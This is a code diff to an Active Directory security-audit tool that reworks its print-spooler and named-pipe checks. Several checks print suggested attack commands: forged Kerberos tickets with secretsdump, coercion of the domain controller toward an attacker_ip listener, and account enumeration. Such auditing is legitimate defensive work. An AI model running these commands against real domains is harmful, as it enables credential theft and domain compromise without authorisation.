@@ -263,28 +263,15 @@ class ADcheck:
         self.pprint(result, f'Kerberos password last changed : {ndays} day(s) ago')
         self.pprint('EXPLOIT', f'impacket-ticketer -aesKey aes_key -domain-sid sid -domain domain -dc-ip dc_ip user\n{'':9}export KRB5CCNAME=ticket_path; impacket-secretsdump -k dc')
 
-    # async def spooler(self):
-    #     from impacket.dcerpc.v5 import transport, rprn
+    async def spooler(self):
+        result = False
 
-    #     rpctransport = transport.DCERPCTransportFactory(rf'ncacn_np:{self.dc_ip}[\pipe\spoolss]')
-    #     if self.do_kerberos:
-    #         rpctransport = transport.DCERPCTransportFactory(rf'ncacn_np:{self.hostname}[\pipe\spoolss]')
-    #         rpctransport.set_kerberos(True, kdcHost=self.hostname)
-    #     rpctransport.set_credentials(domain=self.domain, username=self.username, password=self.password, nthash=self.nthash, aesKey=self.aes_key)
-    #     dce = rpctransport.get_dce_rpc()
-
-    #     try:
-    #         dce.connect()
-    #         dce.bind(rprn.MSRPC_UUID_RPRN)
-    #         self.pprint(True, 'Spooler service is enabled on remote target : True')
-    #     except Exception as e:
-    #         if 'STATUS_ACCESS_DENIED' in str(e):
-    #             message = 'Access denied'
-    #         elif 'STATUS_OBJECT_NAME_NOT_FOUND' in str(e):
-    #             message = 'Spooler service is enabled on remote target: False'
-    #         else:
-    #             message = f'Unhandled exception occurred: {e}'
-    #         self.pprint(False, message)
+        pipes = await self.smb_client.list_named_pipes()
+        for pipe in pipes:
+            if 'spoolss' in pipe:
+                result = True 
+        self.pprint(result, f'Spooler service is enabled on remote target : {result}')
+        self.pprint('EXPLOIT', f'coercer coerce --always-continue -u user -p password -l attacker_ip -t dc_ip')
 
     async def reversible_password(self):
         result = []
@@ -831,9 +818,12 @@ class ADcheck:
             self.pprint('INFO', f'Users with description : {len(result)}')
         self.pprint('EXPLOIT', 'ldapdomaindump -u "domain\\user" -p "password" --no-grep --no-json dc_ip')
 
-    # async def namedpipes(self):
-    #     result = [pipe.get_longname() for pipe in self.smb_client.listPath('IPC$', r'\\*')]
-    #     self.pprint('INFO', f'Named Pipes :\n{json.dumps(result, indent=4)}')
+    async def namedpipes(self):
+        self.pprint('INFO', f'List of Named pipes :')
+        pipes = await self.smb_client.list_named_pipes()
+        for result in pipes:
+            self.pprint('INFO', f'{'':4}\\pipe\\{result}')
+        self.pprint('EXPLOIT', f'rpcclient -U "domain\\user%password" dc_ip\n{'':9}enum4linux-ng -u user -p password dc_ip')
 
     async def ldap_anonymous(self):
         # msldap : (False, Exception('Not implemented authentication method: NONE'))
